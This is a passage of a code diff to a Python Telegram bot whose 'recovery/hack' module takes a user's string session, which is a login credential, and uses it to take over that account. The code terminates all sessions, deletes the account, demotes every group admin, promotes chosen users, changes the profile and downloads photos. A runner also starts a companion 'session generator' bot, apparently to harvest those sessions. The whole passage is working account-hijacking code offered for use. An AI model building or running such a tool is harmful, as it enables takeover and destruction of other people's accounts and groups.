-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await del_ch_2(session.text, gc.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature H - Check 2FA
-@app.on_callback_query(filters.regex("^H$"))
-async def feature_h(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_H$"))
+async def feature_h_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await check_2fa(session.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await check_2fa_2(session.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature I - Terminate All Sessions
-@app.on_callback_query(filters.regex("^I$"))
-async def feature_i(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_I$"))
+async def feature_i_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await terminate_all(session.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await terminate_all_2(session.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature J - Delete Account
-@app.on_callback_query(filters.regex("^J$"))
-async def feature_j(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_J$"))
+async def feature_j_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await del_acc(session.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await del_acc_2(session.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature K - Promote User
-@app.on_callback_query(filters.regex("^K$"))
-async def feature_k(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_K$"))
+async def feature_k_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await promote_user(session.text, gc.text, user.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await promote_user_2(session.text, gc.text, user.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature L - Demote All Admins
-@app.on_callback_query(filters.regex("^L$"))
-async def feature_l(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_L$"))
+async def feature_l_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
-    result = await demote_all(session.text, gc.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await demote_all_2(session.text, gc.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature M - Send to Saved Messages
-@app.on_callback_query(filters.regex("^M$"))
-async def feature_m(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_M$"))
+async def feature_m_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     msg = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛᴏ sᴇɴᴅ:**")
-    result = await send_to_saved(session.text, msg.text)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await send_to_saved_2(session.text, msg.text)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature N - Get Active Sessions
-@app.on_callback_query(filters.regex("^N$"))
-async def feature_n(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_N$"))
+async def feature_n_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await get_active_sessions(session.text)
+    result = await get_active_sessions_2(session.text)
     
     if len(result) > 3855:
         with open("sessions.txt", "w") as f:
@@ -1429,32 +1167,22 @@ async def feature_n(client, query):
         await client.send_document(chat_id, "sessions.txt")
         os.remove("sessions.txt")
     else:
-        await query.message.reply_text(
-            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-            reply_markup=HACK_MODS
-        )
+        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature O - Download Profile Photos
-@app.on_callback_query(filters.regex("^O$"))
-async def feature_o(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_O$"))
+async def feature_o_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
-    result = await download_profile_pics(session.text)
+    result = await download_profile_pics_2(session.text)
     
     if result and isinstance(result, str) and os.path.exists(result):
         await client.send_photo(chat_id, result, caption="**✅ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ!**")
         os.remove(result)
     else:
-        await query.message.reply_text(
-            text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-            reply_markup=HACK_MODS
-        )
+        await query.message.reply_text(text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
-
-# Feature P - Change Profile
-@app.on_callback_query(filters.regex("^P$"))
-async def feature_p(client, query):
+@recovery_bot.on_callback_query(filters.regex("^hack_P$"))
+async def feature_p_2(client, query):
     chat_id = query.message.chat.id
     session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
     fname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ғɪʀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
@@ -1465,23 +1193,40 @@ async def feature_p(client, query):
     ln = None if lname.text == "." else lname.text
     bi = None if bio.text == "." else bio.text
     
-    result = await change_profile(session.text, fn, ln, bi)
-    await query.message.reply_text(
-        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
-        reply_markup=HACK_MODS
-    )
+    result = await change_profile_2(session.text, fn, ln, bi)
+    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)
 
 
-# ==================== MAIN ====================
+# ╔═══════════════════════════════════════════════════════════════╗
+# ║                    MAIN RUNNER                                ║
+# ╚═══════════════════════════════════════════════════════════════╝
+
+async def main():
+    print("=" * 60)
+    print("🚀 Starting Both Bots...")
+    print("=" * 60)
+    
+    # Start Bot 1
+    await session_gen_bot.start()
+    me1 = await session_gen_bot.get_me()
+    print(f"✅ Bot 1 (Session Generator): @{me1.username}")
+    
+    # Start Bot 2
+    await recovery_bot.start()
+    me2 = await recovery_bot.get_me()
+    print(f"✅ Bot 2 (Recovery/Hack): @{me2.username}")
+    
+    print("=" * 60)
+    print("✅ Both Bots are Running!")
+    print("=" * 60)
+    
+    # Keep running
+    await idle()
+    
+    # Stop both bots
+    await session_gen_bot.stop()
+    await recovery_bot.stop()
+    print("👋 Bots Stopped!")
+
 if __name__ == "__main__":
-    logger.info("🚀 Bot Starting...")
-    logger.info(f"💞 Created by {OWNER_NAME}")
-    
-    async def main():
-        await app.start()
-        logger.info("✅ Bot Started Successfully!")
-        await idle()
-        await app.stop()
-        logger.info("🛑 Bot Stopped!")
-    
-    app.run(main())
+    asyncio.run(main())
